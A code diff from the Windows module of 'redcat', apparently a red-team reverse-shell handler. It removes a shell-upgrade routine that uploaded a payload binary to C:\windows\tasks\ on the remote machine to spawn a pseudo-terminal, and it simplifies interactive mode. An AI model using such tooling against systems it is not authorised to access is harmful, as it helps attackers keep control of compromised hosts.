@@ -41,12 +41,6 @@ class Windows(redcat.platform.Platform):
             data = b""
         return res, cmd_success, data.decode("utf-8").replace("\r", "").replace("\n", "").strip()
 
-    def disable_echo(self) -> typing.Tuple[bool, str]:
-        return self.send_cmd("echo off")
-
-    def enable_echo(self) -> typing.Tuple[bool, str]:
-        return self.send_cmd("echo on")
-
     def download(self, rfile: str) -> typing.Tuple[bool, str, bytes]:
         cmd_success = False
         error = redcat.style.bold("failed to download remote file ") + redcat.style.bold(redcat.style.red(f"{rfile}"))
@@ -114,86 +108,14 @@ class Windows(redcat.platform.Platform):
                     error = redcat.style.bold("failed to upload ") + redcat.style.bold(redcat.style.red(f"{rfile}")) + redcat.style.bold(": " + data.decode("utf-8"))
         return cmd_success, error
 
-    def upgrade(self) -> typing.Tuple[bool, str]:
-        if not self._has_pty:
-            res = False
-            error = redcat.style.bold("Raindrop didn't manage to spawn a pty")
-            raindrop_local_path = redcat.payloads.get_payload_path("raindrop.exe")
-            raindrop_remote_path = "C:\\windows\\tasks\\raindrop.exe"
-            with open(raindrop_local_path, "rb") as f:
-                data = f.read()
-                self.send_cmd(f"del {raindrop_remote_path}")
-                cmd_success, error = self.upload(f"{raindrop_remote_path}", data)
-            if cmd_success:
-                success_msg = b"SUCCESS: pty ready!\n"
-                self.channel.purge()
-                columns, rows = os.get_terminal_size(0) 
-                upgrade_cmd = f"{' '.join([raindrop_remote_path, 'cmd', str(rows), str(columns)])}"
-                self.send_cmd(upgrade_cmd)
-                rdata = b""
-                timeout = 10
-                timed_out = False
-                start_time = time.time()
-                end_time = 0
-                while (success_msg not in rdata) and (not timed_out):
-                    resp = self.channel.retrieve()
-                    rdata += resp
-                    end_time = time.time()
-                    if end_time - start_time > timeout:
-                        timed_out = True
-                        error = redcat.style.bold("Raindrop didn't manage to spawn a pty")
-                    else:
-                        time.sleep(0.1)
-                if not timed_out:
-                    self._has_pty = True
-                    time.sleep(0.3)
-                    self.channel.purge()
-                    self.send_cmd("powershell")
-                    self.send_cmd("cmd")
-                    self._saved_settings = termios.tcgetattr(sys.stdin.fileno())
-            else:
-                error += f"\n{redcat.style.bold('Shell upgrade failed')}"
-        return cmd_success, error
-
     @redcat.platform.Platform._with_lock
     def interactive(self, value: bool, session_id: str = None, raw:bool =True) -> bool:
-        if self._has_pty:
-            if value:
-                self._saved_settings = termios.tcgetattr(sys.stdin.fileno())
-                self.send_cmd("exit")
-                self.send_cmd("\x03")
-                self.enable_echo()
-                self.channel.wait_data(1)
-                self.channel.purge()
-                res, _ = self.send_cmd("cls", end="\r")
-                tty.setraw(sys.stdin.fileno())
-                self._raw = True
-                self._interactive = True
-            else:
-                res, _ = self.send_cmd("\x03")
-                if res and self.channel.is_open:
-                    # use cmd shell when backgrounded
-                    # we can't just call exit because user may have called another shell
-                    res, _ = self.send_cmd("cmd")
-                    res, _ = self.send_cmd("set PROMPT= ")
-                    self.disable_echo()
-                    self.channel.wait_data(1)
-                    time.sleep(0.1)
-                    self.channel.purge()
-                    termios.tcsetattr(sys.stdin.fileno(), termios.TCSADRAIN, self._saved_settings)
-                    self._interactive = False
-                    self._raw = False
-        else:
-            self.channel.wait_data(0.3)
-            time.sleep(0.1)
-            if value:
-                self.enable_echo()
-            else:
-                self.disable_echo()
-            self._interactive = value
-            self.channel.purge()
-            res, _ = self.send_cmd("")
-            self._raw = False
+        self.channel.wait_data(0.3)
+        time.sleep(0.1)
+        self._interactive = value
+        self.channel.purge()
+        res, _ = self.send_cmd("")
+        self._raw = False
         return res
 
     def send_cmd(self, cmd: str, end="\r\n", wait_for: int = 0.1) -> typing.Tuple[bool, str]:
